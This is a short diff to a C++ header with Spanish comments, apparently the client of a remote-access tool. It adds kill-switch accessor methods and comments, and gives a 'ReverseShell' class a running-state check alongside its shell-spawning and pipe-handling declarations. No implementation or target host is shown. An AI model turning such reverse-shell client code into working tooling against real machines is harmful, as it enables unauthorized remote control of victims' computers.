@@ -78,7 +78,7 @@ class Cliente {
 		bool isQueueRunning = true;
 		bool isShellRunning = false;
 		bool BLOCK_MODE = false;
-		bool isKillSwitch = false;
+		bool killSwitch = false;
 		
 	public:
 		SOCKET sckSocket = INVALID_SOCKET;
@@ -114,6 +114,7 @@ class Cliente {
 		//Log Remoto
 		void m_RemoteLog(const std::string _strMsg);
 
+		//Armar y enviar paquete con informacion inicial
 		void iniPacket();
 
 		//Proceso de paquetes
@@ -124,7 +125,12 @@ class Cliente {
 		void Procesar_Comando(const Paquete_Queue& paquete);
 		void Procesar_Paquete(const Paquete& paquete);
 		
+		//Borrar objetos de modulos creados y detener su ejecucion
 		void DestroyClasses();
+
+		//Kill switch
+		bool isKillSwitch();
+		void setKillSwitch(bool _valor);
 
 		bool m_isRunning() {
 			std::unique_lock<std::mutex> lock(mtx_running);
@@ -160,6 +166,8 @@ class ReverseShell {
 		bool SpawnShell(const char* pStrComando);
 		void StopShell();		
 		void TerminarShell();
+
+		bool m_IsRunning();
 
 		void thEscribirShell(std::string pStrInput);
 		void thLeerShell(HANDLE hPipe);
